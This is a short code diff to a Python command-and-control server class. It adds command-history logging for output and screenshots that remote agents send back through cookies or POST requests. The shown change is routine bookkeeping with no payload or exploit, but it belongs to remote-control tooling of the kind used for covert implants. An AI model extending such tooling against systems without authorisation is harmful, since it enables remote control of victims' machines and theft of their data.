@@ -373,8 +373,10 @@ class C2Server:
                 self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
                 updated_output = decrypted_output.replace("[SCREENSHOT]", "")
                 self.db.set_command_output(uuid, updated_output)
+                self.db.update_command_history_output(uuid, updated_output)
             else:
                 self.db.set_command_output(uuid, decrypted_output)
+                self.db.update_command_history_output(uuid, decrypted_output)
                 self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via cookie")
         except Exception as e:
             self.logger.log_event(f"Error saving output from cookie: {e}")
@@ -401,8 +403,10 @@ class C2Server:
                 self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
                 updated_output = command_output.replace("[SCREENSHOT]", "")
                 self.db.set_command_output(uuid, updated_output)
+                self.db.update_command_history_output(uuid, updated_output)
             else:
                 self.db.set_command_output(uuid, command_output)
+                self.db.update_command_history_output(uuid, command_output)
                 self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via POST")
                 
             response_data = {
